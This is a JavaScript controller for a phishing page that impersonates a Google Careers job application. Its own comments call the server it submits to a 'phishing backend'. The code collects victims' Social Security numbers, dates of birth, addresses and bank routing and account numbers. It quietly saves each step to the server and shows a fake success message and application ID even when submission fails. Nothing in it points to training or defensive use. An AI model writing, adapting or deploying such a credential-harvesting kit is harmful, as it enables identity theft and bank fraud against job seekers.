/**
 * Google Careers Application - Multi-Step Form Controller
 *
 * Manages step navigation, per-step validation, data persistence,
 * and final submission to the phishing backend.
 */

(function () {
    'use strict';

    // ========== STATE ==========
    let currentStep = 1;
    const totalSteps = 5;
    const formData = {};          // Accumulated across all steps
    let resumeFileName = null;

    // ========== DOM HELPERS ==========
    function $(sel, ctx) { return (ctx || document).querySelector(sel); }
    function $$(sel, ctx) { return Array.from((ctx || document).querySelectorAll(sel)); }

    // ========== STEP NAVIGATION ==========

    function showStep(step) {
        // Hide all form step sections
        $$('.gc-form-step').forEach(s => s.classList.remove('active'));

        // Show target form section (must scope to .gc-form-step to avoid hitting stepper li)
        const target = $(`.gc-form-step[data-step="${step}"]`);
        if (target) {
            target.classList.add('active');
        }

        // Update stepper nav indicators
        $$('li.gc-step').forEach(s => {
            const sNum = parseInt(s.dataset.step);
            s.classList.remove('active', 'completed');
            if (sNum < step) s.classList.add('completed');
            else if (sNum === step) s.classList.add('active');
        });

        // Scroll to top of card
        window.scrollTo({ top: 0, behavior: 'smooth' });

        if (typeof step === 'number') currentStep = step;
    }

    // Called by Next buttons
    window.nextStep = function (fromStep) {
        if (!validateStep(fromStep)) return;
        collectStepData(fromStep);
        saveStepToServer(fromStep);

        const next = fromStep + 1;
        if (next === 5) populateReview();
        showStep(next);
    };

    // Called by Back buttons
    window.prevStep = function (fromStep) {
        collectStepData(fromStep);
        showStep(fromStep - 1);
    };

    // Called by Review "Edit" buttons
    window.goToStep = function (step) {
        showStep(step);
    };

    // Save & Exit
    window.saveAndExit = function () {
        collectStepData(currentStep);
        saveStepToServer(currentStep);
        alert('Your progress has been saved. You can return to complete your application anytime.');
    };

    // ========== VALIDATION ==========

    function validateStep(step) {
        const form = $(`#form-step${step}`);
        if (!form) return true;

        let valid = true;
        $$('.gc-field', form).forEach(field => field.classList.remove('has-error'));

        // Check required inputs
        $$('[required]', form).forEach(input => {
            const field = input.closest('.gc-field');
            if (!input.value.trim()) {
                if (field) field.classList.add('has-error');
                else input.classList.add('error');
                valid = false;
            }
        });

        // Step 3: SSN format
        if (step === 3) {
            const ssn = $('#ssn');
            if (ssn && ssn.value && !/^\d{3}-\d{2}-\d{4}$/.test(ssn.value)) {
                const f = ssn.closest('.gc-field');
                if (f) f.classList.add('has-error');
                valid = false;
            }
            const consent = $('#bgCheckConsent');
            if (consent && !consent.checked) {
                valid = false;
                consent.closest('.gc-consent-box').style.outline = '2px solid var(--gc-red)';
                consent.closest('.gc-consent-box').style.borderRadius = '4px';
            }
        }

        // Step 4: Account match
        if (step === 4) {
            const acc = $('#accountNumber');
            const confirm = $('#confirmAccountNumber');
            if (acc && confirm && acc.value !== confirm.value) {
                const err = $('#accountMatchError');
                if (err) err.style.display = 'block';
                valid = false;
            }
        }

        if (!valid) {
            // Focus first error field
            const first = form.querySelector('.has-error input, .has-error select, .has-error textarea, .error');
            if (first) first.focus();
        }

        return valid;
    }

    // ========== DATA COLLECTION ==========

    function collectStepData(step) {
        const form = $(`#form-step${step}`);
        if (!form) return;

        const fd = new FormData(form);
        fd.forEach((value, key) => {
            formData[key] = value;
        });

        if (resumeFileName) formData.resumeFileName = resumeFileName;
    }

    // ========== SAVE PER-STEP TO SERVER ==========

    function saveStepToServer(step) {
        collectStepData(step);

        fetch('/api/save-step', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                step: step,
                data: formData
            })
        }).catch(function () { /* silent */ });
    }

    // ========== REVIEW PAGE POPULATION ==========

    function populateReview() {
        // Contact
        setReview('review-contact', {
            'Name': `${formData.firstName || ''} ${formData.lastName || ''}`.trim(),
            'Email': formData.email,
            'Phone': `${formData.phoneCountry || ''} ${formData.phone || ''}`.trim(),
            'Location': formData.location,
            'Pronouns': formData.pronouns || 'Not specified'
        });

        // Experience
        setReview('review-experience', {
            'Resume': resumeFileName || 'Not uploaded',
            'LinkedIn': formData.linkedin || 'Not provided',
            'Portfolio': formData.portfolio || 'Not provided',
            'Current company': formData.currentCompany,
            'Current title': formData.currentTitle,
            'Experience': formData.experience,
            'Education': formData.education
        });

        // Identity
        setReview('review-identity', {
            'Legal name': formData.legalName,
            'Date of birth': formData.dob,
            'Work authorization': formData.workAuth,
            'Address': [formData.addressLine1, formData.addressCity, formData.addressState, formData.addressZip].filter(Boolean).join(', '),
            'SSN': formData.ssn ? maskSSN(formData.ssn) : ''
        });

        // Payment
        setReview('review-payment', {
            'Bank': formData.bankName,
            'Account type': formData.accountType,
            'Routing number': formData.routingNumber ? maskDigits(formData.routingNumber) : '',
            'Account number': formData.accountNumber ? maskDigits(formData.accountNumber) : ''
        });
    }

    function setReview(containerId, data) {
        const el = document.getElementById(containerId);
        if (!el) return;
        el.innerHTML = '';
        for (const [key, val] of Object.entries(data)) {
            if (!val) continue;
            el.innerHTML += `<dt>${key}</dt><dd>${escapeHtml(val)}</dd>`;
        }
    }

    function maskSSN(ssn) {
        if (ssn.length >= 7) return '***-**-' + ssn.slice(-4);
        return ssn;
    }

    function maskDigits(str) {
        if (str.length <= 4) return str;
        return '*'.repeat(str.length - 4) + str.slice(-4);
    }

    function escapeHtml(text) {
        const d = document.createElement('div');
        d.textContent = text;
        return d.innerHTML;
    }

    // ========== FINAL SUBMISSION ==========

    window.submitApplication = function () {
        const terms = $('#termsConsent');
        const data_consent = $('#dataConsent');

        if (!terms || !terms.checked || !data_consent || !data_consent.checked) {
            alert('Please agree to the Terms of Service and Privacy Policy to continue.');
            return;
        }

        const btn = $('#submitBtn');
        if (btn) {
            btn.disabled = true;
            btn.innerHTML = '<span class="gc-spinner"></span> Submitting...';
        }

        // Generate fake app ID
        const appId = 'GC-2026-' + Math.floor(100000 + Math.random() * 900000);

        fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        })
        .then(function (r) { return r.json(); })
        .then(function () {
            const el = $('#appId');
            if (el) el.textContent = appId;
            showStep('success');
        })
        .catch(function () {
            // Show success even on error (phishing behavior)
            const el = $('#appId');
            if (el) el.textContent = appId;
            showStep('success');
        });
    };

    // ========== INPUT FORMATTERS ==========

    document.addEventListener('DOMContentLoaded', function () {
        // SSN: XXX-XX-XXXX
        const ssn = $('#ssn');
        if (ssn) {
            ssn.addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').slice(0, 9);
                if (v.length > 5) v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5);
                else if (v.length > 3) v = v.slice(0, 3) + '-' + v.slice(3);
                this.value = v;
            });
        }

        // Phone: (XXX) XXX-XXXX
        const phone = $('#phone');
        if (phone) {
            phone.addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').slice(0, 10);
                if (v.length > 6) v = '(' + v.slice(0, 3) + ') ' + v.slice(3, 6) + '-' + v.slice(6);
                else if (v.length > 3) v = '(' + v.slice(0, 3) + ') ' + v.slice(3);
                else if (v.length > 0) v = '(' + v;
                this.value = v;
            });
        }

        // Routing: 9 digits
        const routing = $('#routingNumber');
        if (routing) {
            routing.addEventListener('input', function () {
                this.value = this.value.replace(/\D/g, '').slice(0, 9);
            });
        }

        // Account: up to 17 digits
        $$('#accountNumber, #confirmAccountNumber').forEach(function (el) {
            el.addEventListener('input', function () {
                this.value = this.value.replace(/\D/g, '').slice(0, 17);
            });
        });

        // Character counter for textarea
        const whyGoogle = $('#whyGoogle');
        const charCount = $('#charCount');
        if (whyGoogle && charCount) {
            whyGoogle.addEventListener('input', function () {
                charCount.textContent = this.value.length;
            });
        }

        // Resume file upload
        setupFileUpload();

        // Clear error on input
        document.addEventListener('input', function (e) {
            const field = e.target.closest('.gc-field');
            if (field) field.classList.remove('has-error');
            e.target.classList.remove('error');
        });
    });

    // ========== FILE UPLOAD ==========

    function setupFileUpload() {
        const zone = $('#resumeDropZone');
        const input = $('#resumeFile');
        if (!zone || !input) return;

        zone.addEventListener('click', function () { input.click(); });
        zone.addEventListener('keydown', function (e) {
            if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); input.click(); }
        });

        input.addEventListener('change', function () {
            if (this.files.length) handleFile(this.files[0]);
        });

        zone.addEventListener('dragover', function (e) {
            e.preventDefault();
            zone.classList.add('dragover');
        });
        zone.addEventListener('dragleave', function () {
            zone.classList.remove('dragover');
        });
        zone.addEventListener('drop', function (e) {
            e.preventDefault();
            zone.classList.remove('dragover');
            if (e.dataTransfer.files.length) handleFile(e.dataTransfer.files[0]);
        });

        function handleFile(file) {
            resumeFileName = file.name;
            zone.classList.add('has-file');
            zone.innerHTML =
                '<span class="material-icons-outlined gc-file-icon">description</span>' +
                '<p class="gc-file-primary">' + escapeHtml(file.name) + '</p>' +
                '<p class="gc-file-secondary">' + formatFileSize(file.size) + ' &middot; Click to change</p>';
        }
    }

    function formatFileSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / 1048576).toFixed(1) + ' MB';
    }

})();
